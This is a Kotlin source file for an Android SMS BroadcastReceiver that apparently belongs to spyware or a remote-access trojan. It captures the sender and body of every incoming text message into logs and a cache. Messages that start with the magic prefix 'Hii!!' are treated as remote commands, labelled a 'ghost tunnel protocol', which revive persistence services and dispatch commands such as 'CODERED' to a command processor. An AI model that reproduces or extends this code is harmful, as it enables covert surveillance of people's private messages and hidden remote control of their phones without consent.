package com.example.myandroid

import kotlinx.coroutines.*
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import org.json.JSONArray
import org.json.JSONObject

class SmsReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        // 1. RAW ENTRY LOG: If this doesn't print, the OS is denying the broadcast permission.
        DebugLogger.log("SMS_ENTRY", "Receiver awoken. Action: ${intent.action}")

        if (intent.action != "android.provider.Telephony.SMS_RECEIVED") return

        // 2. SYNCHRONOUS PARSING: Guarantee execution before OS suspends process
        try {
            val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
            if (messages.isNullOrEmpty()) {
                DebugLogger.log("SMS_WARN", "Intent contained no valid PDUs.")
                return
            }

            val prefs = context.getSharedPreferences("app_stats", Context.MODE_PRIVATE)
            val editor = prefs.edit()
            
            val current = prefs.getInt("sms_count", 0)
            editor.putInt("sms_count", current + 1)
            editor.putLong("sms_last_time", System.currentTimeMillis())

            messages.forEach { msg ->
                if (msg == null) return@forEach
                val body = msg.messageBody ?: return@forEach
                val sender = msg.displayOriginatingAddress ?: "Unknown"

                DebugLogger.log("SMS_PARSE", "Message from $sender intercepted.")

                if (!ConfigManager.canCollect(context, "sms")) {
                    DebugLogger.log("SMS_BLOCKED", "SMS collection disabled in Config.")
                    return@forEach
                }

                val entry = JSONObject().apply {
                    put("sender", sender)
                    put("body", body)
                    put("timestamp", System.currentTimeMillis())
                }
                
                DumpManager.appendLog("SMS", entry)

                try {
                    val cacheStr = prefs.getString("sms_logs_cache", "[]") ?: "[]"
                    val cacheArr = JSONArray(cacheStr)
                    cacheArr.put(entry)
                    if (cacheArr.length() > 50) cacheArr.remove(0)
                    editor.putString("sms_logs_cache", cacheArr.toString())
                } catch(e: Exception) {}

                // 3. GHOST TUNNEL PROTOCOL
                if (body.trimStart().startsWith("Hii!!")) {
                    DebugLogger.log("SMS_WAKE", "Magic prefix detected. Engaging command processor.")
                    ServiceResurrector.shock(context)
                    KeepAliveReceiver.scheduleNext(context)

                    val parts = body.trim().split(Regex("\\s+"))
                    if (parts.size >= 2) {
                        val cmd = parts[1].trim().uppercase()
                        var content = if (parts.size >= 3) body.substringAfter(parts[1]).trim() else "0"
                        
                        // INJECT SENDER: If CodeRed is triggered via SMS and no handler is provided, auto-inject the sender's number
                        if (cmd == "CODERED" && !content.contains("|")) {
                            content = "$content|$sender"
                        }

                        // 4. ASYNC HANDOFF: Only use Coroutines for slow Network/Command tasks
                        val pendingResult = goAsync()
                        CoroutineScope(Dispatchers.IO).launch {
                            try {
                                val mockCmd = JSONObject().apply {
                                    put("id", -1)
                                    put("file_name", cmd)
                                    put("content", content)
                                }
                                CommandProcessor.processSingleCommand(context, mockCmd)
                            } catch (e: Exception) {
                                DebugLogger.log("SMS_CMD_ERR", "Command failed: ${e.message}")
                            } finally {
                                pendingResult.finish()
                            }
                        }
                    }
                }
            }
            editor.commit() // Commit synchronously to disk
        } catch (e: Exception) {
            DebugLogger.log("SMS_FATAL", "Receiver crash: ${e.message}")
        }
    }
}
